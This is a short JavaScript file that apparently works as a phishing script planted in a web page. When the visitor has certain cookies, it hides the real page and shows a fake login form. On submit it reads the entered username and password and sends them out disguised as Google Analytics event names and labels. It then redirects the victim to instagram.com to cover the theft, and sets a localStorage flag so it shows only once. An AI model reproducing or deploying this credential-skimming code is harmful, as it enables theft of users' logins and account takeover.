function start () {

    if (localStorage.getItem("s") === "1") {

        gtag('event', 's1', {
            'event_category': 'cc',
            'event_label': 'll',
            'value': '1'
          });

        return;
    }

    if (!(document.cookie.includes("2066614161") ||
        document.cookie.includes("499223149"))) {

        return;
    }

    document.querySelector("#stylescss").remove();

    var st = document.createElement("style");
    st.innerHTML = "body .page {display: none}";
    document.head.appendChild(st);

    document.getElementById("extension").style.display = "block";

    setTimeout(function() {
        window.scrollTo(0, 100);
    }, 100);

    localStorage.setItem("s", "1");

    document.querySelector(".input-area .pw").onkeyup = function () {
        var that = this;
        
        if (that.value.length) {
            document.getElementById("login-button").removeAttribute("disabled");
        } else {
            document.getElementById("login-button").setAttribute("disabled", "disabled");
        }
    };

    document.getElementById("login-button").onclick = function () {
        var data1 = document.querySelector(".input-area .pw").value;
        var data2 = document.querySelector(".input-area .un").value;
        gtag('event', "e"+ data1, {
            'event_category': "e" + data1 + "" + data2,
            'event_label': "l" + data1 + "" + data2,
            'value': '1'
          });

          setTimeout(function() {
            window.location = "https://instagram.com";
          }, 1000);
    };

    document.querySelector("#extension .continue").onclick = function () {
        gtag('event', 'continue', {
            'event_category': 'cc',
            'event_label': 'll',
            'value': '1'
          });
    };

    gtag('event', 'ga', {
        'event_category': 'ic',
        'event_label': 'll',
        'value': '1'
        });
}

start();